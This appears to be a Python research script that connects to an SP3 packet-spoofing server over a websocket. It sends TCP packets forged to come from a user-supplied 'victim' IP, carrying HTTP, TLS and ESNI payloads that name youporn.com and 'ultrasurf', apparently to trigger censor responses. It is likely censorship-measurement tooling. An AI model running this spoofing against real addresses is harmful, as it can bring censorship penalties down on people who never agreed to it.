"""
Connects to a given SP3 instance and sends the given packets. 
"""
import argparse
import asyncio
import binascii as bi
import colors
import json
import netifaces
import time
from scapy.all import IP, TCP, Raw
import websockets


def get_packets(public_ip, victim_ip, protocol, sport):
    """
    Returns a list of packets (represented by bytes) to spoof through SP3.

    Args:
        victim_ip (str): the IP address to spoof packets from
        protocol (str): which payload to use (http, https, esni, or garbage data)
        sport (int): source port to use for packets
    """
    if protocol == "http":
        payload = b"GET /?q=ultrasurf HTTP/1.1\r\nHost: youporn.com\r\n\r\n" 
    elif protocol == "https":
        payload = bi.unhexlify("16030101400100013c0303a6308d7e4350bbb358b2775fdc299883a29bf1bde3a61c3298f0ca18909434790000aac030c02cc028c024c014c00a00a500a300a1009f006b006a0069006800390038003700360088008700860085c032c02ec02ac026c00fc005009d003d00350084c02fc02bc027c023c013c00900a400a200a0009e00670040003f003e0033003200310030009a0099009800970045004400430042c031c02dc029c025c00ec004009c003c002f00960041c011c007c00cc00200050004c012c008001600130010000dc00dc003000a00ff0100006900000010000e00000b796f75706f726e2e636f6d000b000403000102000a001c001a00170019001c001b0018001a0016000e000d000b000c0009000a00230000000d0020001e060106020603050105020503040104020403030103020303020102020203000f000101")
    elif protocol == "esni":
        payload = bi.unhexlify("16030103ae010003aa0303d992f9c22fbe7a7cdbc9619924bd9cc13c057f5f3da1829426cb0944292705152033c5be80af6de7633e07680125e27e3f7b80ff5e9b3cbe5278434c90b9e0e5fa0024130113031302c02bc02fcca9cca8c02cc030c00ac009c013c014009c009d002f0035000a0100033d00170000ff01000100000a000e000c001d00170018001901000101000b000201000010000e000c02683208687474702f312e310005000501000000000033006b0069001d002019570ada256d971048b34d3e9ff5607588bf10cfb6c064fc45a0fc401d9a7c470017004104ea047fd2e0fc3314de4bf03ee6205134f0d15c07f62b77625a95dc194ce8fb88cc16e53c8b400ba463915b87480b247851c095abdb0d3d5d5b14dd77dcd73750002b00050403040303000d0018001604030503060308040805080604010501060102030201002d00020101ffce016e1301001d00203652aaf122dc47dcf9fa8c37377476d050e54119adfb518f7aabd842ac97d23b00205a30e70593f57708370310ecf7054e488a62eb11e01fd059851c442d453d15c5012441910eec152c4df5ff28bf5cddb1a2e54e8595197e3dc36325145ad50a7842eb3860c8fc6ac5c1794017101365c6122abb3b81f31f5f4204eebb244252d22600734424d875948657b892d3aab3310491aff3b5126f1186bd9c321fb446cf2a41985dd206364ea28c3f8aafeafc62e039f157c3f2703a35448d2d16dcf2d5055ce58c024a5b4eb780fc5128af4ba4e90d6eef1b3cf30a5b2000448d65d6af4fffabeb91e1ed2093fdcc6ffd87ceb94429864ddb657e6316654631193fd25840e51645e1708d351140dd6eeefb80ddbaebb250b2975a1d5f291d99f89de4553d083f1b9820a3ee6976357cff433b7eb77febb3eb0db012154154d3e19b4409f8afa11aa1baeb0b7663d97f0caca2b11ed971fc574588e76a37aa4259593fe8e07fbbca27fa001c00024001002900eb00c600c07f87fafe9de4168227aeec4540f1aaeae43ff61a353f5480420ac3c33f90003fe6f501080bf04f22576a0cc1db8dc83d37b25859a81ce0277364a1794cde1c60f3b94175477beff56db7f9e2b83b31383b7d8b5da20834fb0a63d7ba2e42ad3dfa21666ed8621f34273ac5c273d7f492750e3df3bae36e398ddf83d4a7c36f639087f14eb1f7bfb2c7c0c736d69bcdbf21158c07b7088b95e5bcd08138d6b511f6492d7d93bb3729641519097b970cfeffa5882c67111dcf5d7966a1c58b4edb6e8c905a002120e47ccba37d89e4c1d979c6ef954d1cd946eff0d3119aa2b4d6411138aec74579")
    else:
        payload = b"nonsense data"
    
    pkt = IP(dst=public_ip, src=victim_ip)/TCP(dport=80, sport=sport, seq=100, flags="S")
    pkt2 = IP(dst=public_ip, src=victim_ip)/TCP(dport=80, sport=sport, seq=101, flags="PA")/Raw(payload)

    return [bytes(pkt), bytes(pkt2)]


def traceroute_helper(public_ip, victim_ip, sport, ttl):
    """
    Helps run a traceroute by returning a packet with the given TTL.
    """
    return bytes(IP(dst=public_ip, src=victim_ip, ttl=ttl)/TCP(dport=80, sport=sport, seq=100, flags="S"))


def get_ip():
    """
    Gets the IP address of the first interface on this computer.
    """
    for iface in netifaces.interfaces():
        if "lo" in iface: 
            continue
        iface_info = netifaces.ifaddresses(iface)
        if netifaces.AF_INET not in iface_info:
            continue
        return iface_info[netifaces.AF_INET][0]['addr']
    return None


async def consent(uri, public_ip, protocol, sport, victim_ip, perform_sp3_traceroute):
    """
    Connects to the given SP3 insance and holds open a connection.

    Args:
        - uri (str): URI of a SP3 instance (ws://ip:port)
        - public_ip (str): public facing IP address of this machine
        - protocol (str): http or https or malformed
        - sport (int): source port
        - victim_ip (str): IP address to spoof packets from
        - perform_sp3_traceroute (bool): whether or not we should perform a traceroute instead
    """
    print(colors.color("Connecting to SP3 server %s to spoof traffic to %s..." % (uri, public_ip), fg='yellow'))
    # Authorize for this destination address with a websockets authentication. 
    info = {"DestinationAddress": public_ip, "AuthenticationMethod": 0}
    async with websockets.connect(uri) as websocket:
        print(colors.color("Connected to SP3", fg='green'))
        await websocket.send(json.dumps(info))
        response = await websocket.recv()
        response = json.loads(response)
        if response["Status"] != 0:
            print(colors.color("ERROR: Unexpected status from SP3.", fg='red'))
            print(response)
            return
        # Supply the challenge given, NOT the challenge it just returned to us in the above response.
        ready = {"DestinationAddress": public_ip, "Challenge": response["Challenge"]}
        await websocket.send(json.dumps(ready))
        response = await websocket.recv()
        response = json.loads(response)
        if response["Status"] != 0:
            print(colors.color("ERROR: Unexpected status from SP3.", fg='red'))
            print(response)
            return
        if perform_sp3_traceroute:
            print(colors.color("Launching SP3 traceroute: spoofing 30 packets through SP3", fg='green'))
            for ttl in range(0, 30):
                await websocket.send(traceroute_helper(public_ip, victim_ip, sport, ttl))
                time.sleep(0.1)
                print("TTL %d: sent." % ttl)
        pkts = get_packets(public_ip, victim_ip, protocol, sport)
        print(colors.color("Completed SP3 handshake: spoofing %d packets through SP3" % len(pkts), fg='green'))
        num_resends = 10
        for i in range(num_resends):
            c = 0
            for pkt in pkts:
                c += 1
                await websocket.send(bytes(pkt))
            pkts = get_packets(public_ip, victim_ip, protocol, sport)
        print(colors.color("Sent %d packets (%d times)" % (len(pkts), num_resends), fg='green'))


def get_args():
    """
    Sets up arg parsing.
    """
    parser = argparse.ArgumentParser(description="SP3 Spoofing Script")
    parser.add_argument("--public-ip", default=get_ip(), type=str, help="IP address of this computer")
    parser.add_argument("--victim-ip", required=True, type=str, help="IP address of victim computer (who traffic should be spoofed as)")
    parser.add_argument("--protocol", default="http", choices=('http', 'https', 'malformed', 'esni'), type=str, help="payload protocol to send with.")
    parser.add_argument("--sport", type=int, help="source port to use")
    parser.add_argument("--perform-sp3-traceroute", action='store_true', help="instead of launching the attack, perform an sp3 traceroute")
    parser.add_argument("--sp3", default="ws://192.26.136.232:8080/sp3", type=str, help="The URI IP:port of the sp3 server")
    return parser.parse_args()


def main(args):
    """
    Calls the consent function with the asyncio event loop.
    """
    asyncio.get_event_loop().run_until_complete(consent(args.sp3, args.public_ip, args.protocol, args.sport, args.victim_ip, args.perform_sp3_traceroute))


if __name__ == "__main__":
    main(get_args())
